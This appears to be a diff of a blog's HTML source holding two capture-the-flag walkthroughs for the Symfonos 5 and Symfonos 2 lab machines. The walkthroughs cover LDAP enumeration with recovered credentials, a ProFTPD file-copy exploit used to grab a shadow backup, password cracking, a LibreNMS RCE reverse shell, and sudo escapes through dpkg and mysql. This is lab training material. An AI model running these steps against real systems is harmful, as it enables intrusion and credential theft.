+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From admin.php we get credentials that can be used on ldap.&lt;/p>
 &lt;h1 id="getting-shell-as-zeus">Getting shell as zeus&lt;/h1>
 &lt;p>With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -x -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span> -w qMDdyZh3cT6eeAWD -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ldapsearch -x -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span> -w qMDdyZh3cT6eeAWD -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>From the output, the userPassword is base64 encoded. After decoding it we get &lt;code>cetkKf4wCuHC9FET&lt;/code> and can login
 as zeus via ssh.&lt;/p>
@@ -623,9 +660,9 @@ as zeus via ssh.&lt;/p>
 &lt;p>From &lt;a href="https://gtfobins.github.io/gtfobins/dpkg/" target="_blank" rel="noopener">gtfobins&lt;/a>
 we only need to execute the below commands to
 abuse this.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo dpkg -l
-!/bin/bash
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo dpkg -l
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>!/bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h1 id="extras">Extras&lt;/h1>
 &lt;p>When accessing the passwd file, we couldn&amp;rsquo;t see any user with home directory in /home looking at the configuration
@@ -653,7 +690,7 @@ backup file to a smb share accessible anonymously using a file copy vulnerabilit
 and privilege escalation was achieved by exploiting rce a locally running librenms instance and finally abusing
 sudo permissions on mysql to get root.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
-&lt;pre>&lt;code>Nmap scan report for 192.168.191.129
+&lt;pre tabindex="0">&lt;code>Nmap scan report for 192.168.191.129
 Host is up (0.00028s latency).
 PORT STATE SERVICE VERSION
 21/tcp open ftp ProFTPD 1.3.5
@@ -664,7 +701,7 @@ PORT STATE SERVICE VERSION
 |_ 256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
 80/tcp open http WebFS httpd 1.21
 |_http-server-header: webfs/1.21
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&amp;#39;t have a title (text/html).
 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
 Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
@@ -692,12 +729,12 @@ Host script results:
 &lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="samba-139445">Samba (139/445)&lt;/h2>
 &lt;p>Running smbmap on the target we see we can access the &lt;strong>anonymous&lt;/strong> share without credentials:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -R -H 192.168.191.129
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>smbmap -R -H 192.168.191.129
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/smbmap.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Using smbclient to download log.txt from the anonymous share.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.129&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N -c &lt;span style="color:#e6db74">&amp;#39;get backups\log.txt log.txt&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>From log.txt, we discover a backup of the shadow file is created in /var/backups/&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.129&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N -c &lt;span style="color:#e6db74">&amp;#39;get backups\log.txt log.txt&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From log.txt, we discover a backup of the shadow file is created in /var/backups/&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h2 id="ftp-21">FTP (21)&lt;/h2>
 &lt;p>Checking for known vulnerabilities of the proftp version using searchsploit, we find several.&lt;/p>
@@ -709,29 +746,31 @@ which only serves static content.&lt;/p>
 of the anonymous share:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>We can exfiltrate information to the anonymous share by exploiting file copy on proftpd. Using the PoC shown here
-&lt;a href="https://www.exploit-db.com/exploits/36742,">https://www.exploit-db.com/exploits/36742,&lt;/a> let&amp;rsquo;s get the shadow.bak file. You can either use netcat or telnet.
+&lt;a href="https://www.exploit-db.com/exploits/36742" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36742&lt;/a>
+, let&amp;rsquo;s get the shadow.bak file. You can either use netcat or telnet.
 In this case I use netcat.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -vn 192.168.191.129 &lt;span style="color:#ae81ff">21&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nc -vn 192.168.191.129 &lt;span style="color:#ae81ff">21&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Running smbmap command again we see that we have shadow.bak file.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h2 id="shell-as-aeolus">Shell as aeolus&lt;/h2>
 &lt;p>After downloading the shadow file from the smb we can crack it with john and rockyou wordlist.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt shadow.bak
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt shadow.bak
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Using sergioteamo as the password we can access ssh as aeolus.&lt;/p>
 &lt;p>Doing some basic manual enumeration, we see some ports listening on localhost.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>8080 would most likely be a webserver, so I&amp;rsquo;ll tunnel to it first using an ssh port forward.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -L 8000:127.0.0.1:8080 aeolus@192.168.191.129
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>When we visit http://127.0.0.1:8000 on the browser, we find that LibreNMS is running here.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -L 8000:127.0.0.1:8080 aeolus@192.168.191.129
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When we visit http://127.0.0.1:8000 on the browser, we find that LibreNMS is running here.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Using searchsploit again we find two existing vulnerabilities for version 1.46.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Since we can&amp;rsquo;t verify the version of librenms currently running, we&amp;rsquo;ll try the exploits and see if they work. I&amp;rsquo;ll go for the RCE.&lt;/p>
-&lt;p>Using the exploit script provided here &lt;a href="https://www.exploit-db.com/exploits/47044,">https://www.exploit-db.com/exploits/47044,&lt;/a> we need to provide url, session cookies,
+&lt;p>Using the exploit script provided here &lt;a href="https://www.exploit-db.com/exploits/47044" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47044&lt;/a>
+, we need to provide url, session cookies,
 rhost and rport where the reverse shell will be received.&lt;/p>
 &lt;p>Login using the earlier discovered credentials &lt;strong>aeolus : sergioteamo&lt;/strong>, then retrieve the cookies using burpsuite.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -741,8 +780,8 @@ rhost and rport where the reverse shell will be received.&lt;/p>
 &lt;h2 id="getting-a-root-shell">Getting a root shell&lt;/h2>
 &lt;p>Running sudo -l reveals cronus can run mysql as root with no password.&lt;/p>
 &lt;p>Dropping into mysql as root user, we can get a root shell using the below command.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#ae81ff">\!&lt;/span> bash
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">\!&lt;/span> bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
 &lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
